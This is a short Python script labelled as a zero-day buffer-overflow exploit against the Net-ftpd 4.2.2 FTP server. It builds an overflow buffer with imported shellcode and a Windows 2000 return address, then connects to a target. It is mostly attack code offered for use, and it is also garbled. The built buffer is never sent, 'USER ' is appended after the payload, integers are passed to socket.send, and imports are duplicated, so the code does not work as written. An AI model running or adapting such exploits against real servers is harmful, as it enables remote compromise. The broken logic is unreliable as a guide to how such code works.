#
# Net-ftpd 4.2.2 user autentication b0f exploit (0day)
# coded by Sergio 'shadown' Alvarez
#

import struct
import socket
import sys
import time
from payload import buf
import socket
import struct

def shell_attack(target_machine, target_port):
	buffer	=	b"\x41"*(512-len(buf)-50)
	buffer +=	struct.pack(b'<L', 0xcacacaca)
	# check if the value is an integer, otherwise it should be a string
	buffer	+=	buf
	buffer  +=	struct.pack(b'<L', 0xdeadbeef)
		
	# assemble buffer to send
	buffer	+=	b"USER "
	
	buffer	+=	b'\x42'*(50-4)
	exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	exp.connect((target_machine, target_port))
	exp.recv(100)

	
	
	exp.send(b'findskt')
	exp.send(1234)
	exp.send(1014)
	exp.send(0xdeadbeef) # sometimes needed, just in case
	exp.send(b'\x4c\xfa\x12\x00') # Universal Win2k SP0/SP1/SP2/SP3/SP4 (jmp to our input buffer)
	exp.close()
	

# milw0rm.com [2005-04-26]